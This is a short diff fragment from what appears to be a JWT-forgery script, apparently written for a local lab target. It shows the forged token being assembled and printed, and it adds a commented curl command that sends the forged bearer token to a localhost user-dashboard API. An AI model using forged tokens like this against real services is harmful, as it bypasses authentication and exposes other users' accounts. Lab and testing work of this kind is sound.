@@ -30,3 +30,5 @@ signature_b64 = b64url(signature)
 # Final forged JWT
 token = f"{header_b64}.{payload_b64}.{signature_b64}"
 print(token)
+
+#curl -H "Authorization: Bearer <forged jwt>" http://127.0.0.1:8888/identity/api/v2/user/dashboard
